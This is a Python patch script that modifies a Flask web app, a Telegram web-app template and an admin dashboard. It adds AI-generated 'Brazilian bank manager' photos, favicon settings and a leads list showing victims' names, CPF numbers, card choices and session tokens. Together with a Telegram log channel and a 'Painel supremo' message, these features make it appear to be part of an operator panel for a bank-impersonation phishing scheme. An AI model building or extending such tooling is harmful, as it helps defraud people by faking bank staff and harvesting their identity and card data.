import os
import re

APP_FILE = "app.py"
DASH_FILE = "templates/admin_dashboard.html"
TG_FILE = "templates/tg_webapp.html"

# 1. Update app.py to save Favicon and Manager Avatar via tg_webapp
with open(APP_FILE, "r", encoding="utf-8") as f:
    app_data = f.read()

# Make sure API tg_admin_update_settings accepts favicon_url and mgr_photo_url
if "manager_photo_url: req.get('mgr_photo_url')" not in app_data:
    app_data = app_data.replace(
        "tg_log_channel = data.get(\"tg_log_channel\")",
        """tg_log_channel = data.get("tg_log_channel")
    mgr_photo_url = data.get("mgr_photo_url")
    favicon_url = data.get("favicon_url")"""
    )
    app_data = app_data.replace(
        "if tg_log_channel is not None:",
        """if mgr_photo_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('manager_photo_url', ?)", (mgr_photo_url,))
    if favicon_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
    if tg_log_channel is not None:"""
    )

with open(APP_FILE, "w", encoding="utf-8") as f:
    f.write(app_data)

# 2. Update tg_webapp.html
with open(TG_FILE, "r", encoding="utf-8") as f:
    tg_data = f.read()

ai_html_tg = """
        <div class="config-row">
          <div class="config-label"><svg class="icon"><use href="#ic-users"></use></svg> Foto do Gerente (URL)</div>
          <input type="text" id="cfg-mgr-photo" class="config-input" placeholder="https://..." oninput="document.getElementById('my-avatar').src=this.value">
        </div>
        <div class="config-row">
          <div class="config-label"><svg class="icon"><use href="#ic-settings"></use></svg> Favicon (URL)</div>
          <input type="text" id="cfg-favicon" class="config-input" placeholder="https://...">
        </div>

        <div style="background:var(--bg); border:1px solid var(--border); border-radius:12px; padding:16px; margin-top:20px; margin-bottom:20px;">
          <h4 style="margin-top:0; font-size:1rem; margin-bottom:12px; color:var(--purple); display:flex; align-items:center; gap:8px;">
            ✨ Gerador de Avatar por IA (Grátis)
          </h4>
          <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px; margin-bottom:12px;">
             <select id="ia-sex" class="config-input"><option value="man">Homem</option><option value="woman">Mulher</option></select>
             <select id="ia-skin" class="config-input"><option value="white">Pele Clara</option><option value="black">Pele Escura</option><option value="brown">Pele Parda</option></select>
             <select id="ia-hair" class="config-input"><option value="black">Cabelo Preto</option><option value="blonde">Loiro</option><option value="brown">Castanho</option><option value="white">Branco/Grisalho</option></select>
             <input type="text" id="ia-pos" class="config-input" placeholder="Posição (Ex: Sorrindo, de terno)">
             <input type="text" id="ia-bg" class="config-input" placeholder="Fundo (Ex: Banco luxuoso)" style="grid-column: span 2;">
          </div>
          <button class="btn-save" style="background:#25D366; margin-bottom:12px;" onclick="generateAIAvatar(this)">Gerar Imagem</button>
          
          <div id="ia-preview-box" style="display:none; text-align:center;">
             <img id="ia-preview-img" src="" style="width:120px; height:120px; border-radius:16px; object-fit:cover; margin-bottom:10px; border:2px solid var(--purple);">
             <button class="btn-save" onclick="useAIAvatar()">Usar este Avatar</button>
          </div>
        </div>

        <script>
        function generateAIAvatar(btn) {
           btn.innerText = "Gerando... aguarde";
           const sex = document.getElementById('ia-sex').value;
           const skin = document.getElementById('ia-skin').value;
           const hair = document.getElementById('ia-hair').value;
           const pos = document.getElementById('ia-pos').value || "professional smiling";
           const bg = document.getElementById('ia-bg').value || "luxury bank office blur";
           
           const prompt = `Realistic photo of a brazilian bank manager, ${sex}, ${skin} skin, ${hair} hair, ${pos}, background ${bg}, highly detailed, professional corporate attire, 8k`;
           const url = "https://image.pollinations.ai/prompt/" + encodeURIComponent(prompt) + "?width=512&height=512&nologo=true&seed=" + Math.random();
           
           const img = new Image();
           img.src = url;
           img.onload = () => {
               document.getElementById('ia-preview-img').src = url;
               document.getElementById('ia-preview-box').style.display = "block";
               btn.innerText = "Gerar Novamente";
           };
        }
        function useAIAvatar() {
           const url = document.getElementById('ia-preview-img').src;
           document.getElementById('cfg-mgr-photo').value = url;
           document.getElementById('my-avatar').src = url;
           alert("Avatar preenchido! Lembre de clicar em Salvar Configurações.");
        }
        </script>
"""

if "✨ Gerador de Avatar por IA" not in tg_data:
    tg_data = tg_data.replace(
        '<button class="btn-save" onclick="saveConfigs()">Salvar Configurações</button>',
        ai_html_tg + '\n        <button class="btn-save" onclick="saveConfigs()">Salvar Configurações</button>'
    )
    
    # Also update save payload
    tg_data = tg_data.replace(
        "cpf_token: cpf_token, tg_log_channel: document.getElementById('cfg-log-channel').value }",
        "cpf_token: cpf_token, tg_log_channel: document.getElementById('cfg-log-channel').value, mgr_photo_url: document.getElementById('cfg-mgr-photo').value, favicon_url: document.getElementById('cfg-favicon').value }"
    )

with open(TG_FILE, "w", encoding="utf-8") as f:
    f.write(tg_data)


# 3. Update admin_dashboard.html
with open(DASH_FILE, "r", encoding="utf-8") as f:
    dash_data = f.read()

# Show the chosen card and token in leads list
dash_lead_replacement = """
      <div class="lead-info">
        <div class="lead-name">{{ l.nome }}</div>
        <div class="lead-doc">{{ l.cpf }}</div>
        <div class="lead-meta" style="margin-top:4px;">
           <span style="background:var(--purple); color:white; padding:2px 6px; border-radius:4px; font-size:0.7rem;">Cartão: {{ l.card_style or 'Não definido' }}</span>
           <span style="background:var(--bg3); color:var(--text2); padding:2px 6px; border-radius:4px; font-size:0.7rem; font-family:monospace;">Token: {{ l.session_id.split('-')[0] | upper }}</span>
        </div>
      </div>
"""
dash_data = re.sub(r'<div class="lead-info">\s*<div class="lead-name">{{ l\.nome }}</div>\s*<div class="lead-doc">{{ l\.cpf }}</div>\s*</div>', dash_lead_replacement, dash_data)

ai_html_dash = """
      <div style="background:rgba(124,58,237,0.05); border:1px dashed var(--purple); border-radius:12px; padding:16px; margin-bottom:20px;">
          <h4 style="margin-top:0; font-size:1rem; margin-bottom:12px; color:var(--purple); display:flex; align-items:center; gap:8px;">
            ✨ Gerar Imagem com IA (Avatar Grátis)
          </h4>
          <div class="field-row" style="margin-bottom:12px;">
             <select id="dash-ia-sex" class="field-input"><option value="man">Homem</option><option value="woman">Mulher</option></select>
             <select id="dash-ia-skin" class="field-input"><option value="white">Pele Clara</option><option value="black">Pele Escura</option><option value="brown">Pele Parda</option></select>
          </div>
          <div class="field-row" style="margin-bottom:12px;">
             <select id="dash-ia-hair" class="field-input"><option value="black">Cabelo Preto</option><option value="blonde">Loiro</option><option value="brown">Castanho</option><option value="white">Grisalho</option></select>
             <input type="text" id="dash-ia-pos" class="field-input" placeholder="Ex: Sorrindo, de terno">
          </div>
          <div class="field-group">
             <input type="text" id="dash-ia-bg" class="field-input" placeholder="Fundo (Ex: Banco de investimentos luxuoso)">
          </div>
          
          <button type="button" class="btn-primary" style="background:#25D366; margin-bottom:12px;" onclick="generateAIAvatarDash(this)">
            Gerar Imagem Mágica
          </button>
          
          <div id="dash-ia-preview-box" style="display:none; text-align:center;">
             <img id="dash-ia-preview-img" src="" style="width:100px; height:100px; border-radius:16px; object-fit:cover; margin-bottom:10px; border:2px solid var(--purple);">
             <button type="button" class="btn-secondary" onclick="useAIAvatarDash()">Usar esta Imagem</button>
          </div>
        </div>

        <script>
        function generateAIAvatarDash(btn) {
           btn.innerHTML = "Gerando... (pode levar 5s)";
           const sex = document.getElementById('dash-ia-sex').value;
           const skin = document.getElementById('dash-ia-skin').value;
           const hair = document.getElementById('dash-ia-hair').value;
           const pos = document.getElementById('dash-ia-pos').value || "professional smiling";
           const bg = document.getElementById('dash-ia-bg').value || "luxury bank office blur";
           
           const prompt = `Realistic photo of a brazilian bank manager, ${sex}, ${skin} skin, ${hair} hair, ${pos}, background ${bg}, highly detailed, professional corporate attire, 8k`;
           const url = "https://image.pollinations.ai/prompt/" + encodeURIComponent(prompt) + "?width=512&height=512&nologo=true&seed=" + Math.random();
           
           const img = new Image();
           img.src = url;
           img.onload = () => {
               document.getElementById('dash-ia-preview-img').src = url;
               document.getElementById('dash-ia-preview-box').style.display = "block";
               btn.innerHTML = "Gerar Novamente";
           };
        }
        function useAIAvatarDash() {
           const url = document.getElementById('dash-ia-preview-img').src;
           document.getElementById('mgr_photo_url').value = url;
           document.getElementById('mgr-img-preview').src = url;
        }
        </script>
"""

if "✨ Gerar Imagem com IA" not in dash_data:
    dash_data = dash_data.replace(
        '<form id="manager-form" onsubmit="saveManager(event)" enctype="multipart/form-data">',
        ai_html_dash + '\n      <form id="manager-form" onsubmit="saveManager(event)" enctype="multipart/form-data">'
    )

with open(DASH_FILE, "w", encoding="utf-8") as f:
    f.write(dash_data)

print("Painel supremo atualizado com IA e Favicon! Cards adicionados nos leads.")
